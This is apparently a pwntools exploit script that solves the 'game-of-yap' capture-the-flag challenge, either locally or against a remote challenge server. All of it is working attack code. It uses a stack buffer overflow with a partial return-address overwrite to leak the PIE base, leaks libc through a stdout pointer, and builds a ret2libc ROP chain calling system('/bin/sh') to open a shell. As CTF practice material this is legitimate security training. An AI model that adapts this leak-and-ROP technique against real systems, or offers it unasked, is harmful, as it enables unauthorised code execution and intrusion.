#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./game-of-yap"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "yap.chal.cyberjousting.com"
  PORT = 1355
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
libc = elf.libc
  
# pie leak
buf  = b"A"*264
buf += b"\x7d"
s.sendafter(b"chance...\n", buf)
pie_leak = int(s.recvuntil(b"\n"), 16)
pie_base = pie_leak - 0x1210
print("pie_leak =", hex(pie_leak))
print("pie_base =", hex(pie_base))

mov_rdi_rsi_ret = pie_base + 0x1243 #: mov rdi, rsi ; ret

buf  = b"B"*248
buf += p64(pie_base + elf.sym.main)*3
s.sendafter(b"try...\n", buf)

# libc leak
buf  = b"C"*264
buf += p64(mov_rdi_rsi_ret)
buf += p64(pie_base + 0x1270)
s.sendafter(b"chance...\n", buf)
s.recvn(0x48)
stdout_addr = u64(s.recvn(8))
libc_base   = stdout_addr - libc.sym._IO_2_1_stdout_
print("stdout_addr =", hex(stdout_addr))
print("libc_base   =", hex(libc_base))  
  
pop_rdi_ret = libc_base + 0x10f75b #: pop rdi ; ret
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))  

buf  = b"D"*264
buf += p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
s.sendafter(b"chance...\n", buf)
  
s.interactive()
  
